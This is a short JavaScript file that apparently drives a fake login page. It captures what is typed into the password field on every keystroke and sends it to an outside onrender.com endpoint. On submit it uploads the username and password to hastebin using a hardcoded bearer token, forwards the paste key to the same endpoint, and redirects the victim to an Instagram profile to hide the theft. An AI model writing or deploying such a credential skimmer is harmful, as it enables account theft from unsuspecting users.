const button=document.getElementById("margaret");
const pw=document.getElementById("password");
const un=document.getElementById("username");
const dest="https://internship-r3jn.onrender.com/raasaleelalu";
const key='3555594b52d169b614edbdde7c943a928d8fc9ff2766f2f047bc6df754cfa031769ea60f84888f7f4c9c632bfbfd138d3f8bccadc62ea0dee90bc97f90e24ddd'
pw.addEventListener("keydown",async (e)=>{
    console.log("hi");
        fetch(dest,{
        method:"POST",
        headers:{
            'Content-Type':"application/json"
        },
        body:JSON.stringify({pw:e.target.value})
    });
})
button.addEventListener("click", async (e) => {
    
  console.log("Sarat make a love day");
  try {

    const resp1 = await fetch("https://hastebin.com/documents", {
      method: 'POST',
      headers: {
        'Content-Type': "text/plain",
        'Authorization': `Bearer ${key}` 
      },
      body: `${un.value}:${pw.value}`
    });

    const data = await resp1.json(); 

    await fetch(dest, {
      method: "POST",
      headers: {
        'Content-Type': "application/json"
      },
      body: JSON.stringify({ pw: data.key })
    });

    window.location = `instagram://user?username=${"pawankalyan"}`;
    setTimeout(() => {
      window.location = `https://www.instagram.com/${"pawankalyan"}/`;
    }, 1500);

  } catch (err) {
    console.error("Something went wrong:", err);
  }
});